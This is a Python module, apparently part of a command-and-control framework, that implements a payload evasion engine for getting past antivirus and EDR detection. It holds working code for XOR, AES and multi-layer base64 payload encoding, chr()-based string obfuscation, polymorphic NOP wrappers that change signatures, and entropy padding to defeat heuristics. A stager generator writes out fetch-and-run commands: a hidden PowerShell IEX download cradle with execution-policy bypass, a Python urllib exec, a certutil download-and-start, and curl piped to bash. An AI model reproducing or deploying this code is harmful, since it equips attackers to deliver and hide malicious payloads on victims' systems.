"""
Payload evasion engine.

Provides payload encoding, encryption, obfuscation, and stager generation
to evade AV/EDR detection. All techniques are designed to be composable —
multiple layers can be chained for defense-in-depth evasion.

Techniques:
  - XOR encoding with multi-byte keys
  - AES-256-GCM payload encryption (matches C2 crypto pattern)
  - Multi-layer base64 encoding
  - String obfuscation via character concatenation
  - PowerShell/Python stager generation
  - Polymorphic NOP-sled wrappers
  - Entropy reduction for AV heuristic bypass
"""

import base64
import logging
import random
import secrets

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

logger = logging.getLogger("octopus.c2.evasion")


def xor_encode(payload: bytes, key: bytes) -> bytes:
    """XOR-encode a payload with a multi-byte key.

    Performs cyclic XOR of the payload bytes against the key bytes.
    Applying the same function with the same key decodes the payload.

    Args:
        payload: Raw payload bytes to encode.
        key: XOR key bytes. Cycles if shorter than payload.
             Must not be empty.

    Returns:
        XOR-encoded payload bytes (same length as input).

    Raises:
        ValueError: If key is empty.

    Example:
        >>> data = b"Hello, World!"
        >>> key = b"\\xaa\\xbb"
        >>> encoded = xor_encode(data, key)
        >>> xor_encode(encoded, key) == data
        True
    """
    if not key:
        raise ValueError("XOR key must not be empty")

    key_len = len(key)
    return bytes(payload[i] ^ key[i % key_len] for i in range(len(payload)))


def aes_encrypt_payload(payload: bytes) -> tuple[bytes, bytes]:
    """Encrypt a payload using AES-256-GCM.

    Generates a random 256-bit key and 96-bit nonce, encrypts the payload
    with AES-GCM (matching the C2 crypto_engine.py pattern), and returns
    the encrypted blob and key separately.

    The encrypted format is: nonce (12 bytes) || ciphertext || tag (16 bytes).

    Args:
        payload: Raw payload bytes to encrypt.

    Returns:
        Tuple of (encrypted_blob, key) where:
          - encrypted_blob: nonce + ciphertext + GCM tag
          - key: 32-byte AES-256 key (store/transmit securely)

    Example:
        >>> data = b"shellcode here"
        >>> encrypted, key = aes_encrypt_payload(data)
        >>> len(key) == 32
        True
        >>> len(encrypted) > len(data)  # nonce + tag overhead
        True
    """
    key = secrets.token_bytes(32)
    nonce = secrets.token_bytes(12)
    aesgcm = AESGCM(key)
    ciphertext_with_tag = aesgcm.encrypt(nonce, payload, None)

    # Format: [12 bytes nonce][ciphertext][16 bytes tag]
    encrypted_blob = nonce + ciphertext_with_tag

    logger.debug("AES-256-GCM encrypted %d bytes → %d bytes",
                 len(payload), len(encrypted_blob))
    return encrypted_blob, key


def aes_decrypt_payload(encrypted_blob: bytes, key: bytes) -> bytes:
    """Decrypt an AES-256-GCM encrypted payload.

    Companion to aes_encrypt_payload(). Extracts the nonce from the
    blob header and decrypts.

    Args:
        encrypted_blob: Encrypted data (nonce + ciphertext + tag).
        key: 32-byte AES-256 key.

    Returns:
        Decrypted payload bytes.

    Raises:
        ValueError: If blob is too short or key length is wrong.
        cryptography.exceptions.InvalidTag: If authentication fails.
    """
    if len(key) != 32:
        raise ValueError(f"Key must be 32 bytes, got {len(key)}")
    if len(encrypted_blob) < 12 + 16:
        raise ValueError("Encrypted blob too short (missing nonce/tag)")

    nonce = encrypted_blob[:12]
    ciphertext_with_tag = encrypted_blob[12:]

    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext_with_tag, None)


def base64_multilayer(payload: bytes, layers: int = 3) -> str:
    """Apply multiple layers of base64 encoding.

    Each layer base64-encodes the result of the previous layer.
    The decoder must apply base64 decoding the same number of times.

    This increases the effort needed for static analysis and defeats
    simple signature-based detection of base64-encoded payloads.

    Args:
        payload: Raw payload bytes to encode.
        layers: Number of base64 encoding layers to apply.
                Defaults to 3. Must be ≥ 1.

    Returns:
        Multi-layer base64-encoded string.

    Raises:
        ValueError: If layers < 1.

    Example:
        >>> encoded = base64_multilayer(b"test", layers=2)
        >>> import base64
        >>> base64.b64decode(base64.b64decode(encoded)) == b"test"
        True
    """
    if layers < 1:
        raise ValueError(f"Layers must be ≥ 1, got {layers}")

    data = payload
    for _ in range(layers):
        data = base64.b64encode(data)

    return data.decode("ascii")


def base64_multilayer_decode(encoded: str, layers: int = 3) -> bytes:
    """Decode a multi-layer base64-encoded string.

    Companion to base64_multilayer(). Applies the inverse operation.

    Args:
        encoded: Multi-layer base64-encoded string.
        layers: Number of decoding layers. Must match encoding layers.

    Returns:
        Decoded raw bytes.
    """
    data = encoded.encode("ascii")
    for _ in range(layers):
        data = base64.b64decode(data)
    return data


def string_obfuscate(s: str) -> str:
    """Break a string into character concatenation for obfuscation.

    Converts a plaintext string into a series of chr() calls
    concatenated together, making static string analysis harder.

    Args:
        s: Plaintext string to obfuscate.

    Returns:
        Python expression string that evaluates to the original string.

    Example:
        >>> obfuscated = string_obfuscate("cmd")
        >>> eval(obfuscated) == "cmd"
        True
    """
    if not s:
        return '""'

    parts: list[str] = []
    # Randomly group characters (1-3 at a time) for less uniform output
    i = 0
    while i < len(s):
        group_size = min(random.randint(1, 3), len(s) - i)
        group = s[i:i + group_size]

        if group_size == 1:
            parts.append(f"chr({ord(group)})")
        else:
            # Use a mix of chr() calls for the group
            chars = "+".join(f"chr({ord(c)})" for c in group)
            parts.append(chars)
        i += group_size

    return "+".join(parts)


def generate_stager(payload_url: str, method: str = "powershell") -> str:
    """Generate a download-and-execute stager.

    Creates a one-liner or short script that downloads a payload from
    the given URL and executes it in memory.

    Supported methods:
      - 'powershell': PowerShell IEX download cradle
      - 'python': Python urllib exec cradle
      - 'certutil': certutil download + execution
      - 'curl': curl pipe to shell

    Args:
        payload_url: URL where the payload is hosted.
        method: Stager generation method. Defaults to 'powershell'.

    Returns:
        Stager code string ready for deployment.

    Raises:
        ValueError: If method is not supported.
    """
    method = method.lower()

    if method == "powershell":
        return (
            f"powershell -nop -w hidden -ep bypass -c "
            f"\"IEX(New-Object Net.WebClient).DownloadString('{payload_url}')\""
        )

    elif method == "python":
        return (
            f"python3 -c \"import urllib.request,os;"
            f"exec(urllib.request.urlopen('{payload_url}').read())\""
        )

    elif method == "certutil":
        # certutil downloads to disk, then executes
        tmp_name = f"C:\\Windows\\Temp\\{secrets.token_hex(4)}.exe"
        return (
            f"certutil -urlcache -split -f {payload_url} {tmp_name} "
            f"&& start /b {tmp_name}"
        )

    elif method == "curl":
        return f"curl -sk {payload_url} | bash"

    else:
        raise ValueError(
            f"Unsupported stager method: {method}. "
            f"Use: powershell, python, certutil, curl"
        )


def polymorphic_wrapper(shellcode: bytes) -> bytes:
    """Add random NOP-equivalent instructions around shellcode.

    Wraps shellcode with random-length NOP sleds and functionally
    equivalent no-operation instructions to change the binary signature
    on each generation. This defeats hash-based detection.

    NOP equivalents used (x86/x64):
      - 0x90: NOP
      - 0x50/0x58: PUSH EAX / POP EAX (net zero effect)
      - 0x51/0x59: PUSH ECX / POP ECX
      - 0x52/0x5A: PUSH EDX / POP EDX
      - 0x53/0x5B: PUSH EBX / POP EBX

    Args:
        shellcode: Raw shellcode bytes to wrap.

    Returns:
        Shellcode with random NOP-equivalent padding prepended
        and appended.
    """
    # NOP-equivalent instruction pairs (push/pop register)
    nop_equivalents: list[bytes] = [
        b"\x90",           # NOP
        b"\x50\x58",       # PUSH EAX; POP EAX
        b"\x51\x59",       # PUSH ECX; POP ECX
        b"\x52\x5a",       # PUSH EDX; POP EDX
        b"\x53\x5b",       # PUSH EBX; POP EBX
        b"\x87\xc0",       # XCHG EAX, EAX (NOP equivalent)
        b"\x87\xc9",       # XCHG ECX, ECX
    ]

    # Random prefix
    prefix_len = random.randint(4, 16)
    prefix = b""
    for _ in range(prefix_len):
        prefix += random.choice(nop_equivalents)

    # Random suffix
    suffix_len = random.randint(2, 8)
    suffix = b""
    for _ in range(suffix_len):
        suffix += random.choice(nop_equivalents)

    result = prefix + shellcode + suffix
    logger.debug("Polymorphic wrapper: %d prefix + %d shellcode + %d suffix bytes",
                 len(prefix), len(shellcode), len(suffix))
    return result


def entropy_reduce(data: bytes) -> bytes:
    """Reduce entropy of data to avoid AV heuristic detection.

    High-entropy data (encrypted payloads, shellcode) triggers AV
    heuristic alerts. This function interleaves the data with
    low-entropy padding bytes to bring the overall entropy down.

    The padding scheme uses a repeating ASCII pattern that mimics
    natural text, with a 4-byte header encoding the original data
    length for extraction.

    Format: [4-byte LE length][interleaved data + padding]

    Args:
        data: High-entropy data to pad.

    Returns:
        Entropy-reduced data with interleaved padding.

    Example:
        >>> original = os.urandom(100)
        >>> reduced = entropy_reduce(original)
        >>> len(reduced) > len(original)  # Padding added
        True
    """
    # Low-entropy padding patterns (ASCII text-like)
    padding_patterns: list[bytes] = [
        b"AAAA",
        b"This",
        b"data",
        b"file",
        b"text",
        b"info",
        b"0000",
        b"    ",
    ]

    # Header: original data length (4 bytes, little-endian)
    import struct
    header = struct.pack("<I", len(data))

    # Interleave: 1 byte of real data, then N bytes of padding
    result = bytearray(header)
    pad_ratio = 3  # 3 padding bytes per real byte

    for i, byte_val in enumerate(data):
        result.append(byte_val)
        # Add padding
        pattern = padding_patterns[i % len(padding_patterns)]
        result.extend(pattern[:pad_ratio])

    logger.debug("Entropy reduced: %d → %d bytes (%.1f%% overhead)",
                 len(data), len(result),
                 (len(result) - len(data)) / max(len(data), 1) * 100)
    return bytes(result)


def entropy_restore(padded_data: bytes) -> bytes:
    """Restore data from entropy-reduced format.

    Companion to entropy_reduce(). Extracts the original data by
    reading the length header and stripping interleaved padding.

    Args:
        padded_data: Entropy-reduced data from entropy_reduce().

    Returns:
        Original data bytes.

    Raises:
        ValueError: If data format is invalid.
    """
    import struct
    if len(padded_data) < 4:
        raise ValueError("Padded data too short (missing header)")

    original_len = struct.unpack("<I", padded_data[:4])[0]
    pad_ratio = 3

    result = bytearray()
    offset = 4  # Skip header
    while len(result) < original_len and offset < len(padded_data):
        result.append(padded_data[offset])
        offset += 1 + pad_ratio  # Skip padding bytes

    if len(result) != original_len:
        raise ValueError(
            f"Data restoration failed: expected {original_len} bytes, "
            f"got {len(result)}"
        )

    return bytes(result)
